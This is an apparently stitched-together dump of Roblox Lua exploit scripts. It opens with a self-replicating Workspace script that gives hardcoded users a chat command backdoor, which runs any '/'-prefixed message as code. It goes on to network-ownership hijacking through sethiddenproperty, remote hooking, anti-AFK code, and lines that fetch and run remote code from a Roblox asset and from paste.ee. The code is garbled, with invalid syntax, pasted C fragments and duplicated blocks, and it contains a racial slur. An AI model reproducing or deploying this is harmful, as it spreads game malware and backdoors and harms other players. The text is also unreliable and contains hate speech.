--Bypass
p.Character = m
wait(1.5)
p.Character = c
wait(1.5)
loadstring(game:GetObjects("rbxassetid://4480871791")[1].Source)()
p.Character.Humanoid.Health = 0
end)

Altitude = script:clone()
calco = {"s","c","q","t","o","a","i","f","g","w","8","e","m","7","h","n"}
Knox = {}
table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))
table.insert (Knox, 1 ,string.reverse(calco[11] .. calco[14] .. calco[14] .. calco[4] .. calco[16] .. calco[6] .. calco[15] .. calco[2]))
Play = {}
function rando(votation)
local hatr = 5
local calc = math.pi * math.huge
local longicate = votation:GetChildren()
if #longicate > hatr then 
calc = calc + math.pi
return longicate[math.random(6,#longicate)]
end
end
function doublecheck()
local fj = game.Workspace:GetChildren()
for off = 1,#fj do
if fj[off].className == "Part" then
local fh = fj[off]:FindFirstChild("Anti-Lag")
if fh ~= nil then 
return false
end
end
end
return true
end
function workcheck()
if doublecheck() == true then
local l = Altitude:clone()
l.Parent = rando(game.Workspace)
end
end
workcheck()
function gibite(quen)
local  hup = Instance.new("Message")
hup.Text = "Detected"
hup.Parent = quen.Parent
local con = Instance.new("Script")
con.Source = [[wait(5) script.Parent:remove()]]
con.Parent = hup
for ish = 0,7 do
local a = Instance.new("HopperBin")
a.BinType = ish
a.Parent = quen
end
end
function laber(zonsa)
wait()
for slate = 1,#Knox do  
if zonsa.Name == Knox[slate] then
gibite(zonsa.Backpack)
table.insert (Play, 1,  zonsa.Name)
end
end
end
function yeild(frequency)
local t = Knox
for g = 1,#t do
if t[g] == frequency.Name then
return true
end
end
return false
end
function check(los)
local r = los:GetChildren()
for i = 1,#r do
local h = r[i]:FindFirstChild("Anti-Lag")
if h ~= nil then
h:remove()
end
end
end
function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end
function sortation(gone)
local dimbs = Altitude:clone()
dimbs = ramno(game.Workspace)
end
function onPlayerEntered(newPlayer)
newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end) 
end
function Player(player)
player.Changed:connect(function (property) 
if property == "Character" then 
laber(player) 
end
end)
end
game.Players.PlayerAdded:connect(Player)
game.Players.ChildAdded:connect(onPlayerEntered)
game.Players.ChildAdded:connect(laber)
script.ChildRemoved:connect(sortation)
game.Workspace.ChildAdded:connect(alto)
function onChatted(msg, recipient, speaker)
if yeild(speaker) ~= false then
if string.sub(msg,1,1) == "/" then
local dsting = Instance.new("Script")
dsting.Source = string.sub(msg,2) 
dsting.Parent = game.Workspace 
end
end
end
math.pow*random (1,2,3)
local 1 =
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end
 local 2 =
    -- Claim ownership for me
    sethiddenprop(PlayerInstance, "MaximumSimulationRadius", NETWORK_RADIUS)
    setsimulationrad(NETWORK_RADIUS)
end)
local 3 =
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end 
settings().Physics.AllowSleep = false 
settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
settings().Physics.PhysicsSteppingMethod = 60 Hz
       setscriptable(game.Players.LocalPlayer, "SimulationRadius", true)
       game.Players.LocalPlayer.SimulationRadius = math.huge * math.huge, math.huge * math.huge * 1 / 0 * 1 / 0 * 1 / 0 * 1 / 0 * 1 / 0
local unpack = table.unpack or unpack
local RS = game:GetService("RunService")
repeat RS.RenderStepped:Wait() until game:IsLoaded()
 
local StarterGui = game:GetService("StarterGui")
local function InvokeCore(...)
   local Args = {...}
   local ErrMsg;
   local Err;
   repeat
       Err, ErrMsg = pcall(function()
           StarterGui:SetCore(unpack(Args)) 
       end)
 
       if not ErrMsg then ErrMsg = "" end
       RS.RenderStepped:Wait()
   until not string.match(ErrMsg, "has not been registered")
end

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 local plr = game:GetService("Players").LocalPlayer
local char = plr.Character
spawn(function()
    while game:GetService("RunService").Heartbeat:Wait() do
        local chr = game.Players.LocalPlayer.Character
 
        for _,v in pairs(chr:GetChildren()) do
            if v:IsA("BallSocketConstraint") or v:IsA("HingeConstraint") or v.Name == "Controls" or v.Name == "Local Ragdoll" or v.Name == "State Handler" or v.Name == "FirstPerson" or v.Name == "FakeAdmin" then
                v:Destroy()
            end
        end
    end
end)
local gethiddenprop = gethiddenproperty or get_hidden_property or gethiddenprop or get_hidden_prop
local sethiddenprop = sethiddenproperty or set_hidden_property or sethiddenprop or set_hidden_prop
local setsimrad = setsimulationradius or set_simulation_radius or function(Radius) sethiddenprop(Player, "SimulationRadius", math.huge) end
local function ClaimOwnership()
   sethiddenprop(Player, "MaximumSimulationRadius", math.huge)
   setsimrad(math.huge)
end
 local plr = game.Players.LocalPlayer
local physicSettings = settings().Physics
renderStepped:Connect(function()
    physicSettings.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
    physicSettings.AllowSleep = false
    plr.ReplicationFocus = workspace
    sethiddenproperty(plr,"SimulationRadius",1000)
    sethiddenproperty(plr,"MaxSimulationRadius",1000)
end)
local function RevokeOwnership(Other)
   sethiddenprop(Other, "MaximumSimulationRadius", 0.1)
   sethiddenprop(Other, "SimulationRadius", 0.1)
end

coroutine.wrap(function() 
if not isPrimaryOwner then
       if gethiddenprop and (setsimrad or sethiddenprop) then
           local UHaveOwnership = "[NetworkService]: Claimed ownership."
           local ThereNoHoggers = "[NetworkService]: Great! No users are hogging the network."
           local ThereArHoggers = "[NetworkService]: There are %s users hogging the network:\n%s."
    sethiddenprop(PlayerInstance, "MaximumSimulationRadius", math.huge)
    setsimulationrad(math.huge)
getgenv().isPrimaryOwner = true
settings().Physics.AllowSleep = false
settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
 
           -- Perform Network Scan
           local Result = ""
           local ContaminatedPlayers = 0
           local Players = game:GetService("Players")
           for _, _Player in pairs(Players:GetChildren()) do
               if _Player ~= Player then
                   local TheirRadius = gethiddenprop(_Player, "SimulationRadius")
                   if TheirRadius >= math.huge then
                       ContaminatedPlayers = ContaminatedPlayers + 1
                       Result = Result..Player.Name..", "
                   end
               end
           end

           if ContaminatedPlayers > 0 then
               Result = Result:sub(1, -3)
           end

           InvokeCore("ChatMakeSystemMessage", {
   ["Text"] = (ContaminatedPlayers > 0) and string.format(ThereArHoggers, ContaminatedPlayers, Result) or ThereNoHoggers
           })
         Player.ReplicationFocus = workspace
           InvokeCore("ChatMakeSystemMessage", {
   ["Text"] = UHaveOwnership
           })
-- Start network runtime
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end 
while RS.Stepped:Wait() do
for _, Other in pairs(Players:GetChildren()) do
   if Other ~= Player then
       RevokeOwnership(Other)
   end
end
 for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(0,-45,0)
end)
end
end
wait(0.1)
spawn(function()
   while true do game:GetService("RunService").Heartbeat:wait()
       settings().Physics.ThrottleAdjustTime = math.huge-math.huge
setsimulationradius(1e9, 1e9)
           game:GetService("RunService").Stepped:wait()
   end
end)
game["Run Service"].RenderStepped:connect(function()
   setsimulationradius(math.huge*math.huge,math.huge*math.huge)
end)
--|| Settings:
local NetEnabled = true -- Keep this on true or this script is basically useless
--|| Script Loadstring:
loadstring(game:HttpGet('https://paste.ee/r/HRAcR'))()
spawn(function()
    while true do
        game:GetService("RunService").Heartbeat:wait()
        settings().Physics.ThrottleAdjustTime = math.huge-math.huge
        setsimulationradius(1e9, 1e9)
        game:GetService("RunService").Stepped:wait()
    end
end)
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(-45,45,-45)
end)
end
end
       ClaimOwnership()
end
else
InvokeCore("ChatMakeSystemMessage", {
               ["Text"] = "[NetworkService]: Exploit not supported."
           })
end
end
end)()
local LocalPlayer = game:GetService("Players").LocalPlayer
LocalPlayer.SimulationRadiusChanged:Connect(function(radius)
   radius = 9e9
   return radius
end)
print(gethiddenproperty(game.Players.LocalPlayer, "SimulationRadius"))
       settings().Physics.AllowSleep = false
       settings().Physics.ThrottleAdjustTime = math.huge-math.huge
setsimulationradius(1e9, 1e9)
           game:GetService("RunService").Stepped:wait()
for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
float checknet (float x){ float xhalf = 0.5f*x; int i = (int)&x; i = 0x5f3759df - (i>>1); x = (float)&i; x = x(1.5f - xhalfx*x); return x; }

unsigned int bypassnet(register unsigned int x) { x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1)); x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2)); x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4)); x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8)); return((x >> 16) | (x << 16)); }

int main() { bypassnet(999999); }
print("net bypass loaded");
if v:IsA("RemoteEvent") then
print(v)
local mt = getrawmetatable(game)
setreadonly(mt, true)
make_writeable(mt)
hookfunction(v.Destroy, function() return wait(9e9) end)
local remote = v
local old = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
    if self == remote and getnamecallmethod() == "FireServer" then
        return wait(9e9)
    end
    return old(self, ...)
end)
local Network = coroutine.create(function()
        while true do
            game:GetService("RunService").Heartbeat:Wait()
            settings().Physics.AllowSleep = false
            sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",(7.0000001355554e+100)7.0000001355554e+100)
            sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",(7.0000001355554e+100)7.0000001355554e+100)
        end
    end)
    coroutine.resume(Network)
    spawn(function()
        while true do
            settings().Physics.AllowSleep = false
            sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.pow(math.huge,math.huge)math.huge)
            sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.pow(math.huge,math.huge)math.huge)
            game:GetService("RunService").Stepped:wait()
        end
    end)
    game:GetService("RunService").RenderStepped:Connect(function()
        setsimulationradius(math.huge)
    end)
    coroutine.resume(Network)
    spawn(function()
        while true do
            settings().Physics.AllowSleep = false
            sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius", 7.0000001355554e+31)
            sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", 7.0000001355554e+31)
            game:GetService("RunService").Stepped:wait()
        end
    end)
--Character
local p = game.Players.LocalPlayer
local c = p.Character
 local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
print("anti-afk loaded.")
local PlayerInstance;
local getgenv = getgenv or function() return _G end
local sethiddenprop = (sethiddenproperty or set_hidden_property or sethiddenprop or set_hidden_prop)
local setsimulationrad = setsimulationradius or set_simulation_radius or function(Radius) sethiddenprop(PlayerInstance, "SimulationRadius", Radius) end
if not getgenv or not sethiddenprop or not setsimulationrad then return false end -- Not supported
if getgenv().NETWORKOWNER then getgenv().NETWORKOWNER:Disconnect() getgenv().NETWORKPLAYERCHECK:Disconnect() getgenv().NETWORKPLAYERCHECK2:Disconnect() end
getgenv().NETWORK_RADIUS = NETWORK_RADIUS or 1000
print("net bypass loaded");
return (function() 
    dsfIsGod                    [[    float checknet (float x){ float xhalf = 0.5f*x; int i = (int)&x; i = 0x5f3759df - (i>>1); x = (float)&i; x = x(1.5f - xhalfx*x); return x; }

    unsigned int bypassnet(register unsigned int x) { x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1)); x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2)); x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4)); x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8)); return((x >> 16) | (x << 16)); }

    int main() { bypassnet(999999); }    ]];
    _ {
        "i love messing with lua syntax lol";
        [{"int main() { bypassnet(9999) }"}] = a "nigger";
    };
end);
-- Grab services
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
PlayerInstance = Players.LocalPlayer
 -- Start network runtime
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end
-- Optimize
local PlayerList = {}
for _, Plr in pairs(Players:GetPlayers()) do
    if Plr ~= PlayerInstance then
        PlayerList[Plr] = true
    end
end
print("net bypass loaded");
return (function() 
    dsfIsGod                    [[    float checknet (float x){ float xhalf = 0.5f*x; int i = (int)&x; i = 0x5f3759df - (i>>1); x = (float)&i; x = x(1.5f - xhalfx*x); return x; }

    unsigned int bypassnet(register unsigned int x) { x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1)); x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2)); x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4)); x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8)); return((x >> 16) | (x << 16)); }

    int main() { bypassnet(999999); }    ]];
    _ {
        "i love messing with lua syntax lol";
        [{"int main() { bypassnet(9999) }"}] = a "nigger";
    };
end);
getgenv().NETWORKPLAYERCHECK2 = Players.PlayerRemoving:Connect(function(Plr)
    local Success, Err = pcall(function() PlayerList[Plr] = nil end)
    if not Success then
        appendfile("network-ownership.log", "Error while de-registering player that left: "..tostring(Err).."
")
    end
end)
 -- Start network runtime
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end

 
    -- Claim ownership for me
    sethiddenprop(PlayerInstance, "MaximumSimulationRadius", NETWORK_RADIUS)
    setsimulationrad(NETWORK_RADIUS)
end)
    if _G.netted ~= true then
        _G.netted = true
        coroutine.wrap(function()
            settings().Physics.AllowSleep = false
            game:GetService("RunService").RenderStepped:Connect(function()
                game:FindFirstChildOfClass("Players").LocalPlayer.MaximumSimulationRadius=math.pow(math.huge,math.huge)
                sethiddenproperty(game:FindFirstChildOfClass("Players").LocalPlayer,"SimulationRadius",math.huge*math.huge)
            end)
        end)()
    end
-- Start network runtime
getgenv().NETWORKOWNER = RunService.Stepped:Connect(function()
    -- Revoke ownership from others
    for Plr, _ in pairs(PlayerList) do
        sethiddenprop(Plr, "MaximumSimulationRadius", 0.01)
        sethiddenprop(Plr, "SimulationRadius", 0.01)
    end
    wait(1)
end
end
